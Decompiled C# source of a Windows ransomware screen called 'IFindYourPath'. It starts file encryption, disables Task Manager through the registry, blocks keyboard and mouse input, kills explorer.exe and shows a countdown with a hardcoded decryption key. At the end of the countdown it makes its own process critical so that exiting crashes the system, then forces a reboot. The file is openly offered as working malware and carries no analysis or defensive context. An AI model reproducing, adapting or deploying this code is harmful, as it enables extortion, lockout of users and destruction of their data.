using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace IFindYourPath_RANSOMWARE;

public class Form1 : Form
{
	private IContainer components = null;

	private RichTextBox richTextBox1;

	private RichTextBox richTextBox2;

	private RichTextBox richTextBox3;

	private Label label1;

	private Button button1;

	private TextBox textBox1;

	private RichTextBox richTextBox4;

	private Timer timer1;

	private Timer explorer_kill;

	private Timer tmr_out;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public Form1()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(120.0).ToString());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		FreezeMouse();
		DateTime startTime = DateTime.Now;
		Encryption.Start();
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		explorer_kill.Start();
		timer1.Start();
		tmr_out.Start();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("The key is incorrect, please try again.", "ERROR", (MessageBoxButtons)1, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "AZ900IO@")
		{
			MessageBox.Show("The sectors are being decrypted...", "Decrypting", (MessageBoxButtons)4, (MessageBoxIcon)48);
			TaskMgrEnable();
			Encryption.OFF_Encrypt();
		}
		MessageBox.Show("The key is incorrect, please try again.", "ERROR", (MessageBoxButtons)1, (MessageBoxIcon)16);
	}

	private void TaskMgrEnable()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		timer1.Stop();
	}

	private void explorer_kill_Tick(object sender, EventArgs e)
	{
		explorer_kill.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		UNFREEZE();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void UNFREEZE()
	{
		BlockInput(block: false);
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		Environment.Exit(-1);
		Thread.Sleep(3000);
		Process.Start("shutdown", "/r /t 0");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Unknown result type (might be due to invalid IL or missing references)
		//IL_0416: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Expected O, but got Unknown
		//IL_04b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0600: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		richTextBox1 = new RichTextBox();
		richTextBox2 = new RichTextBox();
		richTextBox3 = new RichTextBox();
		label1 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		richTextBox4 = new RichTextBox();
		timer1 = new Timer(components);
		explorer_kill = new Timer(components);
		tmr_out = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_BackColor(Color.Black);
		((Control)richTextBox1).set_Font(new Font("Arial", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_ForeColor(Color.Red);
		((Control)richTextBox1).set_Location(new Point(116, 8));
		((Control)richTextBox1).set_Margin(new Padding(2, 2, 2, 2));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(575, 56));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("Your files are encrypted by IFindYourPath RANSOMWARE!");
		((Control)richTextBox2).set_BackColor(Color.Black);
		((Control)richTextBox2).set_Font(new Font("Arial", 11f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox2).set_ForeColor(Color.Yellow);
		((Control)richTextBox2).set_Location(new Point(10, 72));
		((Control)richTextBox2).set_Margin(new Padding(2, 2, 2, 2));
		((Control)richTextBox2).set_Name("richTextBox2");
		((Control)richTextBox2).set_Size(new Size(807, 244));
		((Control)richTextBox2).set_TabIndex(1);
		((Control)richTextBox2).set_Text(componentResourceManager.GetString("richTextBox2.Text"));
		((Control)richTextBox3).set_BackColor(Color.Black);
		((Control)richTextBox3).set_Font(new Font("Arial", 16f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox3).set_ForeColor(Color.Red);
		((Control)richTextBox3).set_Location(new Point(10, 334));
		((Control)richTextBox3).set_Margin(new Padding(2, 2, 2, 2));
		((Control)richTextBox3).set_Name("richTextBox3");
		((Control)richTextBox3).set_Size(new Size(155, 42));
		((Control)richTextBox3).set_TabIndex(2);
		((Control)richTextBox3).set_Text("Time left:");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 22f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Yellow);
		((Control)label1).set_Location(new Point(175, 334));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(137, 35));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("00:00:00");
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(344, 363));
		((Control)button1).set_Margin(new Padding(2, 2, 2, 2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(236, 27));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("DECRYPT");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(344, 334));
		((Control)textBox1).set_Margin(new Padding(2, 2, 2, 2));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(237, 20));
		((Control)textBox1).set_TabIndex(5);
		((Control)richTextBox4).set_BackColor(Color.Black);
		((Control)richTextBox4).set_Font(new Font("Arial", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox4).set_ForeColor(Color.Lime);
		((Control)richTextBox4).set_Location(new Point(615, 325));
		((Control)richTextBox4).set_Margin(new Padding(2, 2, 2, 2));
		((Control)richTextBox4).set_Name("richTextBox4");
		((Control)richTextBox4).set_Size(new Size(179, 72));
		((Control)richTextBox4).set_TabIndex(6);
		((Control)richTextBox4).set_Text("More instructions coming soon.\n\t-Pathfinder, Ifinder.");
		timer1.set_Interval(3000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		explorer_kill.set_Interval(10000);
		tmr_out.set_Interval(7200000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(819, 414));
		((Control)this).get_Controls().Add((Control)(object)richTextBox4);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox3);
		((Control)this).get_Controls().Add((Control)(object)richTextBox2);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Form)this).set_Margin(new Padding(2, 2, 2, 2));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("IFindYourPath_Decrypt0r");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
